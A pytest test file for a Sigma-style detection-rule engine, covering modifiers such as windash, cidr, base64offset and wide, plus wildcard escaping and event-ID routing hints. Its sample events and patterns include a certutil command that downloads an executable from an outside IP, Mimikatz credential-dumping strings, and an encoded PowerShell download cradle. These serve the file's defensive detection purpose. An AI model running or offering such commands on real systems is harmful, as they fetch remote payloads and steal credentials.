"""Sigma-spec engine features added in 0.2 (modifiers, escaping, routing hints)."""
import base64

import pytest

from anvil.engine import (
    UnsupportedRule,
    _b64_variants,
    compile_rule,
    compile_selection,
    parse_condition,
    required_event_ids,
)
from anvil.models import Rule


def sel(s, ev):
    return compile_selection(s)(ev)


def rule(detection, **kw):
    d = {"id": "00000000-0000-4000-8000-000000000001", "title": "t", "description": "d",
         "status": "test", "level": "low", "logsource": {"product": "windows", "category": "process_creation"},
         "detection": detection}
    d.update(kw)
    return Rule.from_dict(d)


EV = {"EventID": 1, "Image": r"C:\Windows\System32\certutil.exe",
      "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.7/a.exe",
      "DestinationIp": "10.1.2.3", "SourceIp": "0:0:0:0:0:0:0:1", "GrantedAccess": "0x1410",
      "ParentUser": "LAB\\alice", "User": "LAB\\alice", "Count": 12, "Empty": ""}


@pytest.mark.parametrize("s,expected", [
    ({"CommandLine|windash|contains": " -urlcache "}, True),
    ({"CommandLine|windash|contains": " /urlcache "}, True),        # / and - interchangeable
    ({"CommandLine|contains|windash": "\u2013split"}, False),        # en-dash literal not in event
    ({"DestinationIp|cidr": "10.0.0.0/8"}, True),
    ({"DestinationIp|cidr": ["192.168.0.0/16", "172.16.0.0/12"]}, False),
    ({"SourceIp|cidr": "::1/128"}, True),                             # non-canonical IPv6 form
    ({"Count|gt": 10}, True),
    ({"Count|lte": 11}, False),
    ({"User|fieldref": "ParentUser"}, True),
    ({"CommandLine|re": "URLCACHE"}, False),                          # regex is case-sensitive
    ({"CommandLine|re|i": "URLCACHE"}, True),
    ({"Missing": None}, True),                                        # null = field absent
    ({"Empty": None}, True),
    ({"Image": None}, False),
    ({"Image|neq": r"C:\Windows\System32\cmd.exe"}, True),
    ({"Image|endswith": r"\CERTUTIL.EXE"}, True),
    ({"Image|endswith|cased": r"\CERTUTIL.EXE"}, False),
    ({"CommandLine|contains": "urlcache*http"}, True),               # wildcard inside contains
    ({"CommandLine|startswith": "certutil.exe ?urlcache"}, True),     # ? = one char
    ({"CommandLine|contains|all": ["-split", "-f", "http"]}, True),
    ({"CommandLine|contains|all": ["-split", "-decode"]}, False),
    ({"GrantedAccess|endswith": ["10", "30"]}, True),
    ({"EventID": [1, 3]}, True),
    ({"EventID": "1"}, True),                                          # numeric/str equivalence
])
def test_modifiers(s, expected):
    assert sel(s, EV) is expected


def test_escaped_wildcards_are_literal():
    ev = {"CommandLine": "echo *star* and ?q"}
    assert sel({"CommandLine|contains": r"\*star\*"}, ev)
    assert not sel({"CommandLine|contains": r"\*nope\*"}, ev)
    assert sel({"CommandLine|endswith": r"and \?q"}, ev)


def test_base64_and_base64offset():
    payload = "Invoke-Mimikatz"
    for shift in range(3):
        blob = base64.b64encode(b"x" * shift + payload.encode()).decode()
        assert sel({"CommandLine|base64offset|contains": payload}, {"CommandLine": f"-enc {blob}"})
    assert sel({"C|base64|contains": "hello"}, {"C": base64.b64encode(b"hello").decode()})
    assert len(_b64_variants(b"abc")) == 3


def test_wide_base64offset_powershell_encodedcommand():
    enc = base64.b64encode("IEX (New-Object Net.WebClient)".encode("utf-16-le")).decode()
    assert sel({"CommandLine|wide|base64offset|contains": "IEX ("}, {"CommandLine": "powershell -e " + enc})


def test_keywords_and_keyless_modifier_map():
    ev = {"Data": "mimikatz sekurlsa::logonpasswords", "Other": 1}
    assert sel(["SEKURLSA::"], ev)                       # keywords are case-insensitive
    assert sel({"|all": ["mimikatz", "logonpasswords"]}, ev)
    assert not sel({"|all": ["mimikatz", "kerberos"]}, ev)


def test_multi_valued_field():
    ev = {"Tags": ["alpha", "beta"]}
    assert sel({"Tags": "beta"}, ev)
    assert sel({"Tags|contains|all": ["alp", "bet"]}, ev)


def test_unsupported_features_raise():
    with pytest.raises(UnsupportedRule):
        compile_selection({"User|expand": "%admins%"})
    with pytest.raises(UnsupportedRule):
        compile_selection({"User|bogus": "x"})
    with pytest.raises(UnsupportedRule):
        parse_condition("selection | count() by host > 5", ["selection"])


def test_condition_list_is_or():
    r = rule({"a": {"Image|endswith": "\\cmd.exe"}, "b": {"Image|endswith": "\\certutil.exe"},
              "condition": ["a", "b"]})
    assert compile_rule(r).matches(EV)


def test_them_ignores_underscore_selections():
    r = rule({"sel": {"EventID": 1}, "_helper": {"EventID": 99}, "condition": "all of them"})
    assert compile_rule(r).matches(EV)


@pytest.mark.parametrize("det,expected", [
    ({"s": {"EventID": 4624, "LogonType": 3}, "condition": "s"}, {4624}),
    ({"s": [{"EventID": 1}, {"EventID": 2}], "condition": "s"}, {1, 2}),
    ({"s": {"EventID": [5, 6]}, "f": {"User": "x"}, "condition": "s and not f"}, {5, 6}),
    ({"a": {"EventID": 1}, "b": {"User": "x"}, "condition": "a or b"}, None),
    ({"a": {"EventID": 1}, "b": {"EventID": 2}, "condition": "1 of them"}, {1, 2}),
    ({"s": {"Image": "x"}, "condition": "s"}, None),
])
def test_required_event_ids(det, expected):
    r = rule(det)
    ast = parse_condition(r.condition, list(r.selections))
    got = required_event_ids(ast, r.selections)
    assert (set(got) if got is not None else None) == expected
